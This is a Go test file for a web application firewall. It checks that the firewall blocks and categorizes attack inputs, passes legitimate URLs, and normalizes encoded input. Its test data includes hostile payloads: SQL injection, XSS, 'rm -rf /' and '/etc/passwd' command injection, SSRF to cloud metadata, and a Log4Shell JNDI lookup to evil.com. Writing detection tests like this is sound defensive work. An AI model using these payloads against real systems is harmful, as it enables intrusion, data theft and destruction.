package main

import (
	"testing"
)

// ── Anomaly scoring tests ───────────────────────────────────────────────────

func TestMatchRulesScoredBlocks(t *testing.T) {
	tests := []struct {
		name      string
		input     string
		wantBlock bool // score >= blockThreshold
		wantCat   string
	}{
		// SQL Injection
		{"SQLi UNION SELECT", "id=1 UNION ALL SELECT username,password FROM users", true, "SQL_INJECTION"},
		{"SQLi DROP TABLE", "'; DROP TABLE users;--", true, "SQL_INJECTION"},
		{"SQLi WAITFOR DELAY", "1; WAITFOR DELAY '0:0:5'--", true, "SQL_INJECTION"},
		{"SQLi xp_cmdshell", "EXEC xp_cmdshell('dir')", true, "SQL_INJECTION"},
		{"SQLi LOAD_FILE", "LOAD_FILE('/etc/passwd')", true, "SQL_INJECTION"},
		{"SQLi stacked INSERT", "; INSERT INTO users VALUES('hacked','pw')", true, "SQL_INJECTION"},
		{"SQLi INFORMATION_SCHEMA", "SELECT * FROM INFORMATION_SCHEMA.TABLES", true, "SQL_INJECTION"},

		// XSS
		{"XSS script tag", "<script>alert(1)</script>", true, "XSS_ATTACKS"},
		{"XSS javascript:", "javascript:alert(document.cookie)", true, "XSS_ATTACKS"},
		{"XSS onerror", `<img src=x onerror=alert(1)>`, true, "XSS_ATTACKS"},
		{"XSS SVG", "<svg onload=alert(1)>", true, "XSS_ATTACKS"},
		{"XSS data URI", "data:text/html,<script>alert(1)</script>", true, "XSS_ATTACKS"},
		{"XSS onfocus", `<input onfocus=alert(1) autofocus>`, true, "XSS_ATTACKS"},
		{"XSS document.cookie", "var x=document.cookie;", true, "XSS_ATTACKS"},
		{"XSS iframe", "<iframe src=http://evil.com>", true, "XSS_ATTACKS"},

		// Command Injection
		{"CMDi semicolon cat", "; cat /etc/passwd", true, "COMMAND_INJECTION"},
		{"CMDi pipe grep", "| grep -r password /", true, "COMMAND_INJECTION"},
		{"CMDi rm -rf", "; rm -rf /", true, "COMMAND_INJECTION"},
		{"CMDi powershell", "powershell -e ZWNobyAiaGVsbG8i", true, "COMMAND_INJECTION"},
		{"CMDi python import", "__import__('os').system('id')", true, "COMMAND_INJECTION"},
		{"CMDi subshell", "$(cat /etc/passwd)", true, "COMMAND_INJECTION"},

		// Directory Traversal
		{"DirT basic", "../../../../../../etc/passwd", true, "DIRECTORY_TRAVERSAL"},
		{"DirT /etc/shadow", "/etc/shadow", true, "DIRECTORY_TRAVERSAL"},
		{"DirT windows", `C:\windows\system32\config\sam`, true, "DIRECTORY_TRAVERSAL"},
		{"DirT double encode", "%252e%252e%252f%252e%252e%252fetc/passwd", true, "DIRECTORY_TRAVERSAL"},
		{"DirT proc self", "/proc/self/environ", true, "DIRECTORY_TRAVERSAL"},

		// SSRF
		{"SSRF AWS metadata", "http://169.254.169.254/latest/meta-data/", true, "SSRF"},
		{"SSRF localhost", "http://127.0.0.1:8080/admin", true, "SSRF"},
		{"SSRF file protocol", "file:///etc/passwd", true, "SSRF"},
		{"SSRF GCP metadata", "http://metadata.google.internal/computeMetadata/v1/", true, "SSRF"},

		// Log4Shell
		{"L4S basic JNDI", "${jndi:ldap://evil.com/a}", true, "LOG4SHELL"},
		{"L4S nested", "${${lower:j}ndi:ldap://evil.com/a}", true, "LOG4SHELL"},
		{"L4S env lookup", "${env:AWS_SECRET_KEY}", true, "LOG4SHELL"},

		// XXE
		{"XXE ENTITY SYSTEM", `<!ENTITY xxe SYSTEM "file:///etc/passwd">`, true, "XXE"},
		{"XXE DOCTYPE", `<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>`, true, "XXE"},

		// Prototype Pollution
		{"PP __proto__", `{"__proto__":{"isAdmin":true}}`, true, "PROTOTYPE_POLLUTION"},
		{"PP constructor.prototype", `constructor.prototype.isAdmin=true`, true, "PROTOTYPE_POLLUTION"},

		// Path Manipulation
		{"PATH php filter", "php://filter/convert.base64-encode/resource=index.php", true, "PATH_MANIPULATION"},
		{"PATH phar", "phar://uploads/evil.jpg", true, "PATH_MANIPULATION"},

		// DLP
		{"DLP AWS key", "AKIAIOSFODNN7EXAMPLE", true, "DATA_LEAK_PREVENTION"},
		{"DLP GitHub token", "ghp_ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefgh", true, "DATA_LEAK_PREVENTION"},
		{"DLP private key", "-----BEGIN RSA PRIVATE KEY-----", true, "DATA_LEAK_PREVENTION"},

		// Unicode
		{"UNI zero-width", "admin\u200b@evil.com", true, "UNICODE_OBFUSCATION"},
		{"UNI RTL override", "file\u202egpj.exe", true, "UNICODE_OBFUSCATION"},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			normalized := normalizeInput(tt.input)
			matches, score := matchRulesScored(normalized)
			blocked := score >= blockThreshold

			if blocked != tt.wantBlock {
				t.Errorf("input=%q: got blocked=%v (score=%d), want blocked=%v",
					tt.input, blocked, score, tt.wantBlock)
			}
			if tt.wantBlock && len(matches) > 0 {
				found := false
				for _, m := range matches {
					if m.Category == tt.wantCat {
						found = true
						break
					}
				}
				if !found {
					cats := make([]string, len(matches))
					for i, m := range matches {
						cats[i] = m.Category + "(" + m.RuleID + ")"
					}
					t.Errorf("input=%q: expected category %q, got %v",
						tt.input, tt.wantCat, cats)
				}
			}
		})
	}
}

// ── False positive tests ────────────────────────────────────────────────────

func TestLegitimateTrafficNotBlocked(t *testing.T) {
	legitimate := []struct {
		name  string
		input string
	}{
		{"Simple URL", "https://www.google.com/search?q=hello+world"},
		{"API endpoint", "/api/v1/users/123/settings"},
		{"JSON body", `{"username":"john","email":"john@example.com"}`},
		{"Form data", "name=John+Doe&email=john%40example.com&city=New+York"},
		{"Wikipedia", "https://en.wikipedia.org/wiki/SQL"},
		{"GitHub README", "https://github.com/user/repo/blob/main/README.md"},
		{"Long query", "https://shop.example.com/products?category=electronics&brand=samsung&sort=price&order=asc&page=2"},
		{"CSS file", "https://cdn.example.com/assets/style.min.css?v=2.3.1"},
		{"REST update", `{"status":"active","role":"user","updated_at":"2024-01-15T10:30:00Z"}`},
		{"Login form", "username=admin&remember=true"},
		{"Search with special chars", "https://search.example.com/q?term=c%2B%2B+programming"},
		{"Download PDF", "https://docs.example.com/report_2024.pdf"},
		{"Calendar date", "https://api.example.com/events?date=2024-01-15&timezone=UTC"},
	}

	for _, tt := range legitimate {
		t.Run(tt.name, func(t *testing.T) {
			normalized := normalizeInput(tt.input)
			_, score := matchRulesScored(normalized)
			if score >= blockThreshold {
				t.Errorf("FALSE POSITIVE: legitimate input %q was blocked (score=%d)", tt.input, score)
			}
		})
	}
}

// ── Normalization tests ─────────────────────────────────────────────────────

func TestNormalizeInput(t *testing.T) {
	tests := []struct {
		name  string
		input string
		want  string
	}{
		{"URL decode", "%3Cscript%3E", "<script>"},
		{"Double encode", "%253Cscript%253E", "<script>"},
		{"HTML entities", "&#60;script&#62;", "<script>"},
		{"Null bytes removed", "file%00.txt", "file.txt"},
		{"Collapse spaces", "a   b   c", "a b c"},
		{"Plus as space", "hello+world", "hello world"},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			got := normalizeInput(tt.input)
			if got != tt.want {
				t.Errorf("normalizeInput(%q) = %q, want %q", tt.input, got, tt.want)
			}
		})
	}
}

// ── Tier ordering test ──────────────────────────────────────────────────────

func TestAllRulesHaveValidTier(t *testing.T) {
	for _, cr := range blockRules {
		for _, rule := range cr.Rules {
			if rule.Tier < 1 || rule.Tier > 3 {
				t.Errorf("Rule %s in %s has invalid tier %d (must be 1-3)",
					rule.ID, cr.Category, rule.Tier)
			}
			if rule.Severity < 1 || rule.Severity > 10 {
				t.Errorf("Rule %s in %s has invalid severity %d (must be 1-10)",
					rule.ID, cr.Category, rule.Severity)
			}
			if rule.ID == "" {
				t.Errorf("Rule in %s has empty ID", cr.Category)
			}
		}
	}
}

func TestRuleIDsUnique(t *testing.T) {
	seen := make(map[string]string)
	for _, cr := range blockRules {
		for _, rule := range cr.Rules {
			if prev, ok := seen[rule.ID]; ok {
				t.Errorf("Duplicate rule ID %q: in %s and %s", rule.ID, prev, cr.Category)
			}
			seen[rule.ID] = cr.Category
		}
	}
}

// ── Benchmark ───────────────────────────────────────────────────────────────

func BenchmarkMatchLegitimateURL(b *testing.B) {
	input := normalizeInput("https://www.example.com/products?category=electronics&page=2&sort=price")
	b.ResetTimer()
	for i := 0; i < b.N; i++ {
		matchRulesScored(input)
	}
}

func BenchmarkMatchMaliciousURL(b *testing.B) {
	input := normalizeInput("https://example.com/?id=1'+UNION+SELECT+username,password+FROM+users--")
	b.ResetTimer()
	for i := 0; i < b.N; i++ {
		matchRulesScored(input)
	}
}

func BenchmarkNormalizeInput(b *testing.B) {
	input := "%253Cscript%253Ealert%2528document%252Ecookie%2529%253C%252Fscript%253E"
	b.ResetTimer()
	for i := 0; i < b.N; i++ {
		normalizeInput(input)
	}
}
